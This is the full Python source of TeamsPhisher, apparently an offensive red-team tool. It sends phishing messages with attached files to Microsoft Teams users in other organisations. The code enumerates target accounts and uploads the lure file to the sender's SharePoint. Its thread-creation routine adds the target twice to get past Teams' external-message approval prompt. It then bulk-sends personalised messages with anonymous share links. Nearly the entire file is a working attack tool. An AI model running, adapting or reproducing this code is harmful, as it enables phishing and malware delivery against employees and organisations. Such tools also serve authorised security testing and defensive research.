#!/usr/bin/python3

import argparse
import requests
import json
import os.path
import sys
import time
from msal import PublicClientApplication
from colorama import Fore, Style
import datetime
from os.path import expanduser
import hashlib

## Global Options and Variables ##
# Greeting: The greeting to use in messages sent to targets. Will be joined with the targets name if the --personalize flag is used
# Examples: "Hi" "Good Morning" "Greetings"
Greeting = "Hi"

# useragent: The useragent string to use for web requests
useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"

# fd: The file descriptor used for logging operations
fd = None

# version: TeamsPhisher version used in banner
__version__ = "1.1.1"

def p_err(msg, exit):
    output = Fore.RED + "[-] " + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)
    if exit:
        sys.exit(-1)

def p_warn(msg):
    output = Fore.YELLOW + "[-] " + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)

def p_success(msg):
    output = Fore.GREEN + "[+] " + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)

def p_info(msg):
    output = Fore.CYAN + msg + Style.RESET_ALL
    print(output)
    if fd:
        p_file(output, True)

def p_task(msg):
    bufferlen = 75 - len(msg)
    output = msg + "." * bufferlen
    print(output, end="", flush=True)
    if fd:
        p_file(output, False)

def p_file(msg, newline):
    fd.write(msg)
    if newline:
        fd.write("\n")
    fd.flush()

def hashFile(file):
    md5 = hashlib.md5()
    sha1 = hashlib.sha1()
    sha256 = hashlib.sha256()

    with open(file, 'rb') as f:
        data = f.read()
    f.close()

    md5.update(data)
    sha1.update(data)
    sha256.update(data)

    p_success("MD5: %s" % (md5.hexdigest()))
    p_success("SHA1: %s" % (sha1.hexdigest()))
    p_success("SHA256: %s" % (sha256.hexdigest()))

def getTenantID(username):

   domain = username.split("@")[-1]

   response = requests.get("https://login.microsoftonline.com/%s/.well-known/openid-configuration" % (domain))

   if response.status_code != 200:
      p_err("Could not retrieve tenant id for domain %s" % (domain), True)

   json_content = json.loads(response.text)
   tenant_id = json_content.get('authorization_endpoint').split("/")[3]

   return tenant_id

def twoFAlogin(username, scope):
    #Values hardcoded for corporate/part of organization users
    app = PublicClientApplication( "1fec8e78-bce4-4aaf-ab1b-5451cc387264", authority="https://login.microsoftonline.com/%s" % getTenantID(username) )

    try:
        # Initiate the device code authentication flow and print instruction message
        flow = app.initiate_device_flow(scopes=[scope])
        if "user_code" not in flow:
            p_err("Could not retrieve user code in authentication flow", exit=True)
        p_warn(flow.get("message"))
    except:
        p_err("Could not initiate device code authentication flow", exit=True)

    # Initiates authentication based on the previously created flow. Polls the MS endpoint for entered device codes.
    try:
        result = app.acquire_token_by_device_flow(flow)
    except Exception as err:
        p_err("Error while authenticating: %s" % (err.args[0]), exit=True)

    return result

def getBearerToken(username, password, scope):
    
    result = None

    # If this string was passed in for scope, we are grabbing our initial Bearer token
    if scope == "https://api.spaces.skype.com/.default":
        p_task("Fetching Bearer token for Teams...")

    # If scope doesn't match the above, we are fetching our Sharepoint Bearer
    else:
        p_task("Fetching Bearer token for SharePoint...")

        # If scope was passed in as a dictionary, we are assembling our sharepoint domain automagically using the UPN from senderInfo
        if isinstance(scope, dict):
            scope = 'https://%s-my.sharepoint.com/.default' % scope.get('tenantName')
        
        # Otherwise scope was passed in as a user-defined option
        else:
            scope = 'https://%s-my.sharepoint.com/.default' % scope

    #Values hardcoded for corporate/part of organization users
    app = PublicClientApplication( "1fec8e78-bce4-4aaf-ab1b-5451cc387264", authority="https://login.microsoftonline.com/%s" % getTenantID(username) )
    try:
        # Initiates authentication based on credentials.
        result = app.acquire_token_by_username_password(username, password, scopes=[scope])
    except ValueError as err:
        if "This typically happens when attempting MSA accounts" in err.args[0]:
            p_warn("Username/Password authentication cannot be used with Microsoft accounts. Either use the device code authentication flow or try again with a user managed by an organization.")
        p_err("Error while acquring token", True)

    # Login not successful
    if "access_token" not in result:
        if "Error validating credentials due to invalid username or password" in result.get("error_description"):
            p_err("Invalid credentials entered", True)
        elif "This device code has expired" in result.get("error_description"):
            p_err("The device code has expired. Please try again", True)
        elif "multi-factor authentication" in result.get("error_description"):
            result = twoFAlogin(username, scope)
        else:
            p_err(result.get("error_description"), True)

    p_success("SUCCESS!")
    return result["access_token"]

def getSkypeToken(bearer):

    p_task("Fetching Skype token...")
    
    headers = {"Authorization": "Bearer " + bearer}

    # Requests a Skypetoken
    # https://digitalworkplace365.wordpress.com/2021/01/04/using-the-ms-teams-native-api-end-points/
    content = requests.post("https://authsvc.teams.microsoft.com/v1.0/authz", headers=headers)

    if content.status_code != 200:
        p_err("Error fetching skype token: %d" % (content.status_code), True)

    json_content = json.loads(content.text)
    if "tokens" not in json_content:
        p_err("Could not retrieve Skype token", True)

    p_success("SUCCESS!")
    return json_content.get("tokens").get("skypeToken")

def getSenderInfo(bearer):
    p_task("Fetching sender info...")

    displayName = None
    userID = None
    skipToken = None
    senderInfo = None

    headers = {
        "Authorization": "Bearer %s" % (bearer)
    }

    # First request fetches userID associated with our sender/bearer token
    response = requests.get(
        "https://teams.microsoft.com/api/mt/emea/beta/users/tenants",
        headers=headers)

    if response.status_code != 200:
        p_err("Could not retrieve senders userID!", True)

    # Store userID as well as the tenantName of our sending user
    userID = json.loads(response.text)[0].get('userId')
    tenantName = json.loads(response.text)[0].get('tenantName')

    # Second, we need to find the display name associated with our userID
    # Enumerate users within sender's tenant and find our matching user
    while True:
        url = "https://teams.microsoft.com/api/mt/emea/beta/users"
        if skipToken:
            url += f"?skipToken={skipToken}"

        response = requests.get(url, headers=headers)

        if response.status_code != 200:
            p_err("Could not retrieve senders display name!", True)

        users_response = json.loads(response.text)
        users = users_response['users']
        skipToken = users_response.get('skipToken')

        # Iterate through retrieved users and find the one that matches our previously retrieved UserID.
        for user in users:
            if user.get('id') == userID:
                senderInfo = user
                break

        if senderInfo or not skipToken:
            break

    # Add tenantName to our senderInfo data for later
    # Populating tenantName by parsing UPN because ran into issues where peoples 'Organization Name' differed from their 'Initial Domain Name'
    if senderInfo:
        senderInfo['tenantName'] = senderInfo['userPrincipalName'].split("@")[-1].split(".")[0]
        p_success("SUCCESS!")
    else:
        p_err("Could not find the sender's user information!", True)

    return senderInfo

def authenticate(args):

    # If given username + password
    if args.username and args.password:
        bToken = getBearerToken(args.username, args.password, 'https://api.spaces.skype.com/.default')
        skypeToken = getSkypeToken(bToken)
        senderInfo = getSenderInfo(bToken)

        # Fetch sharepointToken passing in alternate vars for scope depending on whether specified a specific sharepoint domain to use.
        if args.sharepoint:
            sharepointToken = getBearerToken(args.username, args.password, args.sharepoint)
        else:
             sharepointToken = getBearerToken(args.username, args.password, senderInfo)           

    # Otherwise fail
    else:
        p_err("You must provide a username AND password!", True)

    return bToken, skypeToken, sharepointToken, senderInfo

def findFriendlyName(targetInfo):

    # Check for a space in the display name for an easy win i.e. "Tom Jones"
    if " " in targetInfo.get('displayName'):
        friendlyName = targetInfo.get('displayName').split(" ")[0].capitalize()
    
    # Next we are going to do some guesswork with their UPN i.e. "tom.jones@mytest.onmicrosoft.com"
    elif "@" in targetInfo.get('userPrincipalName'):
        if "." in targetInfo.get('userPrincipalName').split("@"):
            friendlyName = targetInfo.get('userPrincipalName').split("@")[0].split(".")[0].capitalize()
        else:
            friendlyName = targetInfo.get('userPrincipalName').split("@")[0].capitalize()
        
    # Otherwise give up...
    else:
        friendlyName = None

    return friendlyName
    
def jsonifyMessage(message):
    
    jsonMessage = ""

    # Read in message
    with open(message) as f:
        lines = f.readlines()
    f.close()

    # Iterate through lines in message and add proper formatting tags in order to preserve newlines
    for line in lines:
        if line == "\n":
            jsonMessage = jsonMessage + "<p>&nbsp;</p>"
        else:
            jsonMessage = jsonMessage + "<p>%s</p>" % (line)

    return jsonMessage

def enumUser(bearer, email):

    headers = {
        "Authorization": "Bearer " + bearer,
        "X-Ms-Client-Version": "1415/1.0.0.2023031528",
        "User-Agent": useragent
    }

    user = {'email':email}

    content = requests.get("https://teams.microsoft.com/api/mt/emea/beta/users/%s/externalsearchv3?includeTFLUsers=true" % (email), headers=headers)

    if content.status_code == 403:
        p_warn("User exists but the target tenant or your tenant disallow communication to external domains.")
        return None

    if content.status_code == 401:
        p_err("Unable to enumerate user. Is the access token valid?", True)

    if content.status_code != 200 or ( content.status_code == 200 and len(content.text) < 3 ):
        p_warn("Unable to enumerate user. User does not exist, is not Teams-enrolled, is part of senders tenant, or is configured to not appear in search results.")
        return None

    user_profile = json.loads(content.text)[0]
    if "sfb" in user_profile['mri']:
        p_warn("This user has a Skype for Business subscription and cannot be sent files.")
        return None
    else:
        return user_profile

def uploadFile(sharepointToken, senderSharepointURL, senderDrive, attachment):

    p_task("Uploading file: %s" % (attachment))

    # Assemble upload URL
    url = "%s/personal/%s/_api/v2.0/drive/root:/Microsoft%%20Teams%%20Chat%%20Files/%s:/content?@name.conflictBehavior=replace&$select=*,sharepointIds,webDavUrl" % (senderSharepointURL, senderDrive, os.path.basename(attachment))

    headers = {
        "Authorization": "Bearer " + sharepointToken,
        "User-Agent": useragent,
        "Content-Type": "application/octet-stream",
        "Origin": "https://teams.microsoft.com",
        "Referer": "https://teams.microsoft.com/"
    }

    # Read local file
    with open(attachment, mode="rb") as file:
        contents = file.read()

    # Upload file
    content = requests.put(url, headers=headers, data=contents)

    # Seem to have seen both of these codes for file uploads...
    if content.status_code != 201 and content.status_code != 200:
        p_err("Error uploading file: %d" % (content.status_code), True)

    # Parse out the uploadID. We will need this to craft our invite link
    uploadInfo = json.loads(content.text)

    p_success("SUCCESS!")

    return uploadInfo

def createThread(skypeToken, senderInfo, targetInfo):

    headers = {
        "Authentication": "skypetoken=" + skypeToken,
        "User-Agent": useragent,
        "Content-Type": "application/json",
        "Origin": "https://teams.microsoft.com",
        "Referer": "https://teams.microsoft.com/"
    }

    # Body of new thread request.
    # Sending target user MRI TWICE to create a "group chat" in order to bypass "external user message approval" prompt
    # See https://posts.inthecyber.com/leveraging-microsoft-teams-for-initial-access-42beb07f12c4
    body = """{"members":[{"id":\"""" + senderInfo.get('mri') + """\","role":"Admin"},{"id":\"""" + targetInfo.get('mri') + """\","role":"Admin"},{"id":\"""" + targetInfo.get('mri') + """\","role":"Admin"}],"properties":{"threadType":"chat","chatFilesIndexId":"2","cfet":"true"}}"""

    # Create chat thread
    content = requests.post("https://amer.ng.msg.teams.microsoft.com/v1/threads", headers=headers, data=body)

    if content.status_code != 201:
        p_warn("Error creating chat: %d" % (content.status_code))
        return None

    threadID = content.headers.get('Location').split("/")[-1]

    return threadID

def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, attachment, message, personalize, nogreeting):

    # Sending a real message to a target
    if threadID:
        url = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/" + threadID + "/messages"
    
    # Sending a test message to ourselves
    else:
        url = "https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48%3Anotes/messages"

    headers = {
        "Authentication": "skypetoken=" + skypeToken,
        "User-Agent": useragent,
        "Content-Type": "application/json, Charset=UTF-8",
        "Origin": "https://teams.microsoft.com",
        "Referer": "https://teams.microsoft.com/",
    }

    # Format supplied message to be json friendly
    jsonMsg = jsonifyMessage(message)

    # If --nogreeting specified, initialize introduction
    if nogreeting:
        introduction = ""
    # Otherwise standard behavior is to use pre-set greeting 
    else:
        # Initialize standard greeting
        introduction = "<p>%s,</p><p>&nbsp;</p>" % (Greeting)

        # If personalizing, try and fetch friendly name for target and add to greeting
        if personalize:
            friendlyName = findFriendlyName(targetInfo)
            if friendlyName:
                introduction = "<p>%s %s,</p><p>&nbsp;</p>" % (Greeting, friendlyName)

    # Assemble final message
    assembledMessage = introduction + jsonMsg

    body = """{
        "content": "%s",
        "messagetype": "RichText/Html",
        "contenttype": "text",
        "amsreferences": [],
        "clientmessageid": "3529890327684204137",
        "imdisplayname": "phish her",
        "properties": {
            "files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"%s/personal/%s/\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"providerData\\":\\"\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":null,\\"fileUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"siteUrl\\":\\"%s/personal/%s/\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"permissionScope\\":\\"anonymous\\",\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",
            "importance": "",
            "subject": ""
        }
    }""" % (assembledMessage, uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, attachment.split(".")[-1], os.path.basename(attachment), senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), senderSharepointURL, senderDrive, inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
    
    # Send Message
    content = requests.post(url, headers=headers, data=body.encode(encoding='utf-8'))

    if content.status_code != 201:
        p_warn("Error sending message + attachment to user: %d" % (content.status_code))
        return False

    p_success("SUCCESS!")

    return True

def getInviteLink(sharepointToken, senderSharepointURL, senderDrive, senderInfo, targetInfo, uploadID, secureLink):

    # Assemble invite link request URL
    url = "%s/personal/%s/_api/web/GetFileById(@a1)/ListItemAllFields/ShareLink?@a1=guid%%27%s%%27" % (senderSharepointURL, senderDrive, uploadID)

    headers = {
        "Authorization": "Bearer " + sharepointToken,
        "User-Agent": useragent,
        "Accept": "application/json;odata=verbose",
        "Content-Type": "application/json;odata=verbose",
        "Origin": "https://www.odwebp.svc.ms",
        "Referer": "https://www.odwebp.svc.ms/",
    }

    # Define two different settings blocks for the request body depending on if we are sending a secure link or not.
    unsecure = """            "allowAnonymousAccess": true,
            "trackLinkUsers": false,
            "linkKind": 4,
            "expiration": null,
            "role": 1,
            "restrictShareMembership": false,
            "updatePassword": false,
            "password": "",
            "scope": 0"""

    secure = """            "linkKind": 6,
            "expiration": null,
            "role": 1,
            "restrictShareMembership": true,
            "updatePassword": false,
            "password": "",
            "scope": 2"""

    if(secureLink):
        settings = secure
    else:
        settings = unsecure

    # If sender and target info match, this is a test message. Use single recipient PPI
    if(senderInfo == targetInfo):
        # Stitch body together
        body = """
        {
            "request": {
            "createLink": true,
            "settings": {
                %s
            },
            "peoplePickerInput": "[{\\"Key\\":\\"i:0#.f|membership|%s\\",\\"DisplayText\\":\\"%s\\",\\"IsResolved\\":true,\\"Description\\":\\"%s\\",\\"EntityType\\":\\"User\\",\\"EntityData\\":{\\"IsAltSecIdPresent\\":\\"False\\",\\"Title\\":\\"\\",\\"Email\\":\\"%s\\",\\"MobilePhone\\":\\"\\",\\"ObjectId\\":\\"%s\\",\\"Department\\":\\"\\"},\\"MultipleMatches\\":[],\\"ProviderName\\":\\"Tenant\\",\\"ProviderDisplayName\\":\\"Tenant\\"}]"
            }
        }
        """ % (settings, senderInfo.get('userPrincipalName'), senderInfo.get('displayName'), senderInfo.get('userPrincipalName'), senderInfo.get('userPrincipalName'), senderInfo.get('id'))
    
    else:
        # Stitch body together
        body = """
        {
            "request": {
            "createLink": true,
            "settings": {
                %s
            },
            "peoplePickerInput": "[{\\"Key\\":\\"i:0#.f|membership|%s\\",\\"DisplayText\\":\\"%s\\",\\"IsResolved\\":true,\\"Description\\":\\"%s\\",\\"EntityType\\":\\"User\\",\\"EntityData\\":{\\"IsAltSecIdPresent\\":\\"False\\",\\"Title\\":\\"\\",\\"Email\\":\\"%s\\",\\"MobilePhone\\":\\"\\",\\"ObjectId\\":\\"%s\\",\\"Department\\":\\"\\"},\\"MultipleMatches\\":[],\\"ProviderName\\":\\"Tenant\\",\\"ProviderDisplayName\\":\\"Tenant\\"},{\\"Key\\":\\"%s\\",\\"DisplayText\\":\\"%s\\",\\"IsResolved\\":true,\\"Description\\":\\"%s\\",\\"EntityType\\":\\"\\",\\"EntityData\\":{\\"SPUserID\\":\\"%s\\",\\"Email\\":\\"%s\\",\\"IsBlocked\\":\\"False\\",\\"PrincipalType\\":\\"UNVALIDATED_EMAIL_ADDRESS\\",\\"AccountName\\":\\"%s\\",\\"SIPAddress\\":\\"%s\\",\\"IsBlockedOnODB\\":\\"False\\"},\\"MultipleMatches\\":[],\\"ProviderName\\":\\"\\",\\"ProviderDisplayName\\":\\"\\"}]"
            }
        }
        """ % (settings, senderInfo.get('userPrincipalName'), senderInfo.get('displayName'), senderInfo.get('userPrincipalName'), senderInfo.get('userPrincipalName'), senderInfo.get('id'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'), targetInfo.get('userPrincipalName'))


    # Send request
    content = requests.post(url, headers=headers, data=body)

    if content.status_code != 200:
        p_warn("Error fetching sharing link: %d" % (content.status_code))
        print(content.text)
        return None

    # Parse out the sharing URL that we need to send to our user
    inviteInfo = json.loads(content.text)

    return inviteInfo


banner = """
                                    ...                                               
                                :-++++++=-.                                           
                              .=+++++++++++-                                          
                             .++++++++++++++=     :------:                            :-:--.                    
                             :+++++++++++++++.  .----------                           #= .-+.                   
                             :+++++++++++++++.  -----------:                         :#=  :#.                   
        :--------------------------=++++++++-  .------------                          .=+  ++                   
        ----------------------------+++++*+-.   :+=-----===:                          -+-.+:                    
        :---------------------------++++=-.      .=+++++=-.                           .=+:.                    
        :------=%%%%%%%%%%%%%%%%%%%%%%%%--------:...           .:::..                              -*=-:                   
        :------=****#@@#****--------=++++++++++++++-----------.                        -#++-                    
        :----------:+@@+:-----------+++++++++++++++=-----------                        -#++-                     
        :-----------+@@*------------+++++++++++++++=-----------.                       -*+*-                    
        :-----------+@@*------------+++++++++++++++=-----------.                   .   -*++-                    
        :-----------+@@*------------+++++++++++++++=-----------.                   --  -*++-                    
        :-----------+@@*------------+++++++++++++++=-----------.           .       ==  -*++-                .=                     
        :-----------+@@+------------+++++++++++++++=-----------.          .+       -=  :+==-                .*                     
        :---------------------------+++++++++++++++=-----------.          =*       -=  -+=+=                .::                    
        ----------------------------+++++++++++++++=-----------           **       -+  -+=++.               .*=                     
        .:-------------------------=+++++++++++++++=---------=:           #+       :=  ++-:*=                ==                    
                        -++++++++++++++++++++++++++=-------=+=:          :#=       .:. *=: -*-               ==                     
                        .=+++++++++++++++++++++++++*+++++++=-.           -#-        ::++=   :+=.            .==                     
                        :++++++++++++++++++++++++=:.:::::.               -*:        .=+-.    .=+-.          -+:                    
                        .=+*+++++++++++++++++++-                         -+-      .:-=.        .-====----:-==:                    
                            .-+**+++++++++++**+-.                        .++:   .-=-:             .:-====-:.                      
                            :-=++******+=-:                               .=+===--.                  
                                ..:::..                                      ...                     
                                            
                           _____                            ______  _      _       _                 
                          |_   _|                           | ___ \| |    (_)     | |                
                            | |  ___   __ _  _ __ ___   ___ | |_/ /| |__   _  ___ | |__    ___  _ __ 
                            | | / _ \ / _` || '_ ` _ \ / __||  __/ | '_ \ | |/ __|| '_ \  / _ \| '__|
                            | ||  __/| (_| || | | | | |\__ \| |    | | | || |\__ \| | | ||  __/| |   
                            \_  \___| \__,_||_| |_| |_||___/\_|    |_| |_||_||___/|_| |_| \___||_|   
                                                                                                                                                                    
                            v%s developed by %s\n""" % (__version__, "@Octoberfest73 (https://github.com/Octoberfest7)")

if __name__ == "__main__":
    print(banner)

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', dest='username', type=str, required=True,  help='Username for authentication')
    parser.add_argument('-p', '--password', dest='password', type=str, required=True, help='Password for authentication')
    parser.add_argument('-a', '--attachment', dest='attachment', type=str, required=True, help='Full path to the attachment to send to targets.')
    parser.add_argument('-m', '--message', dest='message', type=str, required=True, help='A file containing a message to send with attached file.')
    parser.add_argument('-s', '--sharepoint', dest='sharepoint', type=str, required=False, help='Manually specify sharepoint name (e.g. mytenant.sharepoint.com would be --sharepoint mytenant)')  
    
    # Target group. Choose either a single email or a list of emails.
    parser_target_group = parser.add_mutually_exclusive_group(required=True)
    parser_target_group.add_argument('-e', '--targetemail', dest='email', type=str, required=False, help='Single target email address')
    parser_target_group.add_argument('-l', '--list', dest='list', type=str, required=False, help='Full path to a file containing target emails. One per line.')
    
    parser.add_argument('--greeting', dest='greeting', type=str, required=False, help='Override default greeting with a custom one. Use double quotes if including spaces!')    
    parser.add_argument('--securelink', dest='securelink', action='store_true', required=False, help='Send link to file only viewable by the individual target recipient.')
    parser.add_argument('--personalize', dest='personalize', action='store_true', required=False, help='Try and use targets names in greeting when sending messages.') 
    parser.add_argument('--preview', dest='preview', action='store_true', required=False, help='Run in preview mode. See personalized names for targets and send test message to sender\'s Teams.')         
    parser.add_argument('--delay', dest='delay', type=int, required=False, default=0, help='Delay in [s] between each attempt. Default: 0')
    parser.add_argument('--nogreeting', dest='nogreeting', action='store_true', required=False, help='Do not use built in greeting or personalized names, only send message specified with --message')
    parser.add_argument('--log', dest='log', action='store_true', required=False, help='Write TeamsPhisher output to logfile')

    args = parser.parse_args()

    # If logging, open file and write commandline + banner
    if args.log:
        dt = datetime.datetime.now()
        logfile = "%s/%s" % (expanduser("~"), dt.strftime('%H-%M_%d%b%y_teamsphisher.log'))
        fd = open(logfile, 'w')
        fd.write(" ".join(sys.argv) + "\n")
        fd.write(banner)
        fd.flush()

    p_info("\nConfiguration:\n")

    if args.personalize:
        p_success("Try to personalize greeting by using targets first name")
        
    if args.securelink:
        p_success("Sending secure file link that is only viewable by target and requires target authentication")
    else:
        p_warn("Sending file link that is accessible by anyone with the link")

    if args.delay:
        p_success("Waiting %d seconds between each message" % (args.delay))
    else:
        p_warn("No delay between messages")

    if args.nogreeting:
        p_warn("Built-in greeting disabled; did you specify one in your message?")
    else:
        if args.greeting:
            Greeting = args.greeting
        p_success("Using greeting: %s, --personalize greeting: %s <Name>," % (Greeting, Greeting))
    
    if args.sharepoint:
        p_success("Using manually specified sharepoint name: %s" % (args.sharepoint))
    else:
        p_warn("Resolving sharepoint name automatically- if your tenant uses a custom domain you might have issues!")

    if args.log:
        p_success("Logging TeamsPhisher output at: %s" % (logfile))
    else:
        p_warn("Not logging TeamsPhisher output")

    if args.preview:
        mode = Fore.BLUE + "\nPreview mode: " + Style.RESET_ALL + "Sending test message to sender's account and showing target's friendly names for use with personalized greetings"
    else:
        mode = Fore.BLUE + "\nOperational mode: " + Style.RESET_ALL + "Sending phishing messages to targets!"

    print(mode)
    if args.log:
        p_file(mode, False)

    # Fancy countdown timer to allow operators to review options and abort if necessary
    print("")
    for i in range(5,-1,-1):
        time.sleep(1)
        if i < 10:
            stri = "0" + str(i)
        else:
            stri = str(i)
        print(Fore.RED + "Time left to abort: " + Style.RESET_ALL + stri, end="\r", flush=True)

    p_info("\n\nAuthenticating, verifying files, and uploading attachment\n")

    # Vars to track number of targets/status
    numTargets = 0
    numFailed = 0
    numSent = 0

    # Populate list of emails
    if args.email:
        targets = [args.email]
        numTargets = 1
    else:
        p_task("Reading target email list...")
        try:
            with open(args.list) as f:
                targets = f.read().splitlines()
            f.close()
            numTargets = len(targets)
            p_success("SUCCESS!")
        except:
            p_err("Could not read supplied list of emails!", True)

    # Check to make sure attachment file exists
    if not os.path.isfile(args.attachment):
        p_err("Cannot locate %s!" % (args.attachment), True)

    # Check to make sure message file exists
    if not os.path.isfile(args.message):
        p_err("Cannot locate %s!" % (args.message), True)

    # Authenticate and fetch our tokens and sender info
    bToken, skypeToken, sharepointToken, senderInfo = authenticate(args)

    # Assemble Sharepoint name + Senders drive for later use
    # If user-specified sharepoint was provided, assemble using that value otherwise do so using senderInfo
    if args.sharepoint:
        senderSharepointURL = "https://%s-my.sharepoint.com" % (args.sharepoint)
        senderDrive = "%s_%s_onmicrosoft_com" % (args.username.split("@")[0].replace(".", "_").lower(), args.sharepoint)
    else:
        senderSharepointURL = "https://%s-my.sharepoint.com" % senderInfo.get('tenantName')
        senderDrive = senderInfo.get('userPrincipalName').replace("@", "_").replace(".", "_").lower()

    # Upload file to sharepoint that will be sent as an attachment in chats
    uploadInfo = uploadFile(sharepointToken, senderSharepointURL, senderDrive, args.attachment)

    # Hash file and output for logging/tracking purposes
    p_info("\nHashing file\n")
    hashFile(args.attachment)

    # If preview mode, we are sending the phishing message to our own account so we can review it.
    # To facilitiate this, 'senderInfo' is passed to getInviteLink for both the sender and the target info fields within the function
    # Additionally, threadID is set to None as we are not creating a new chat thread here and this signals sendFile to use our sender's 'notes' thread as the URL.
    if args.preview:
        p_info("\nSending test message to %s\n" % args.username) 
        p_task("%s" % (args.username))

        # Retrieve an invite link for the uploaded file
        inviteInfo = getInviteLink(sharepointToken, senderSharepointURL, senderDrive, senderInfo, senderInfo, uploadInfo.get('sharepointIds').get('listItemUniqueId'), args.securelink)
        if(inviteInfo):
            threadID = None

            # Send attacker-defined message to ourselves for review
            success = sendFile(skypeToken, threadID, senderInfo, senderInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting)

        p_info("\nPreviewing customized names identified by TeamsPhisher\n")
    else:
        p_info("\nSending messages to users!\n")  

    ## LOOP THROUGH USERS ##
    for target in targets:
        p_task("%s" % (target))

        if "@" not in target:
            p_warn("Invalid target specified. Skipping")
            numFailed += 1
            continue

        # If a delay was specified, sleep now.
        if(args.delay):
            time.sleep(args.delay)

        # Enumerate target user info
        targetInfo = enumUser(bToken, target)
        if targetInfo:

            # If preview switch was used, resolve friendly name for each target and print for viewing.
            if args.preview:
                friendlyName = findFriendlyName(targetInfo)

                if friendlyName:
                    p_success("Friendly Name: %s" % (friendlyName))
                else:
                    p_warn("Could not resolve a friendly name!")

            # Real mode. Creating chats and sending messages!
            else:

                # Create new chat thread with target user
                threadID = createThread(skypeToken, senderInfo, targetInfo)
                if threadID:

                    # Retrieve an invite link for the uploaded file
                    inviteInfo = getInviteLink(sharepointToken, senderSharepointURL, senderDrive, senderInfo, targetInfo, uploadInfo.get('sharepointIds').get('listItemUniqueId'), args.securelink)
                    if(inviteInfo):

                        # Send attacker-defined message to target with file sharing URL    
                        success = sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting)
                        if success:
                            numSent += 1
                    else:
                        numFailed += 1
                        continue
                else:
                    numFailed += 1
                    continue
        
        else:
            numFailed += 1
            
    # Print report
    if not args.preview:
        p_info("\nReport:\n")
        p_task("Successes")
        p_success(str(numSent))
        if numFailed:
            p_task("Failures")
            p_err(str(numFailed), False)
        p_task("Total")
        p_info("[~] " + str(numTargets))
